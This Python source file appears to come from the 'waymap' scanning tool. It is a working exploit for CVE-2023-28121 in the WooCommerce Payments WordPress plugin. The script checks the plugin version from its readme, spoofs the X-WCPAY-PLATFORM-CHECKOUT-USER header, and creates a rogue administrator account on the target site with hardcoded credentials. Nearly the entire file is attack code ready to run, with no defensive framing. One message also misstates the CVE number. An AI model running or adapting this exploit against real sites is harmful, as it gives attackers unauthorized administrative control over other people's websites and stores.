# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2023-28121

import re
import urllib3
import requests
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

username = "waymap_admin"
password = "TrixSecSecure123!"
email = "admin@waymap.com"

def verify_woocommerce_version(profile_url):
    print(Style.RESET_ALL + "Checking WooCommerce Payments version:", end=' ')
    try:
        r = requests.get(f"{profile_url}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except Exception as e:
        print(Fore.RED + f'Error... {e}')
        return False 

    if int(version.replace('.', '')) < 562:
        print(Fore.GREEN + f'{version} Is Vulnerable To CVE-2023-28121 Trying To Create Admin')
        return True  
    else:
        print(Fore.RED + f'{version} - Not vulnerable To CVE-2023-28221')
        return False

def create_waymap_admin(profile_url):
    headers = {
        'User-Agent': 'Waymap Offensive Agent',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    data = {
        'rest_route': '/wp/v2/users',
        'username': username,
        'email': email,
        'password': password,
        'roles': 'administrator'
    }

    print(Style.RESET_ALL + "Starting session:", end=' ')
    s = requests.Session()
    try:
        r = s.get(f'{profile_url}', headers=headers, verify=False)
        print(Fore.GREEN + f'done')
    except Exception as e:
        print(Fore.RED + f'Error... {e}')
        return False 

    print(Style.RESET_ALL + "Adding Waymap admin user:", end=' ')
    r = s.post(f'{profile_url}', data=data, headers=headers, verify=False)
    if r.status_code == 201:
        print(Fore.GREEN + f'done')
    else:
        print(Fore.RED + f'Cannot Create Waymap Admin Looks Like Target Is Not Vulnerable {r.status_code}')
        return False 

    print(Style.RESET_ALL + "Success! You can now log in with the following credentials:")
    print(f'Username: {username}')
    print(f'Password: {password}')
    print()
    return True 

def main(profile_url):
    if verify_woocommerce_version(profile_url):
        create_waymap_admin(profile_url)